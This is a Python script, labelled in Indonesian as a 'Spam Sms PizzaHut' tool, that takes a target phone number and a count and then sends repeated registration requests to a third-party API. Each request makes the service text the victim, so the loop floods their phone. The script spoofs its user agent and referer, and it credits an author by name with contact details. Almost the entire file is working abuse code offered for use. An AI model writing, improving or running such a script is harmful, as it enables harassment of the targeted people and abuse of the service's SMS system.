# -*- coding: utf-8 -*-
import os, sys, json, requests
from fake_useragent import UserAgent
from requests.exceptions import *


ua = UserAgent()
hd = {
'user-agent': ua.random ,
'referer': 'https://www.phd.co.id/register',
'Host': 'api-prod.diqit.io',
}
z = 1
os.system("clear"),
print """\n██████╗ ██╗███████╗███████╗ █████╗ ██╗  ██╗██╗   ██╗████████╗
██╔══██╗██║╚══███╔╝╚══███╔╝██╔══██╗██║  ██║██║   ██║╚══██╔══╝
██████╔╝██║  ███╔╝   ███╔╝ ███████║███████║██║   ██║   ██║   
██╔═══╝ ██║ ███╔╝   ███╔╝  ██╔══██║██╔══██║██║   ██║   ██║   
██║     ██║███████╗███████╗██║  ██║██║  ██║╚██████╔╝   ██║   
╚═╝     ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   
                                                             \n"""
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Sms PizzaHut | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
no = raw_input("\x1b[1;93m[@} Contoh : 8811883541\n[-] Masukkan nomor target : ")
jum = raw_input("\x1b[1;93m[•} Massukan jumlah : ")

dat = {
'phone': no
}

for x in range(int(jum)):
        sia = requests.post("https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
        if 'error' in sia:
                   print('\x1b[1;91m[•] Gagal mengirim pesan ke 0'+no)
        else:
                   print('\x1b[1;92m[✓] Sukses mengirim pesan ke 0'+no)
        z += 1
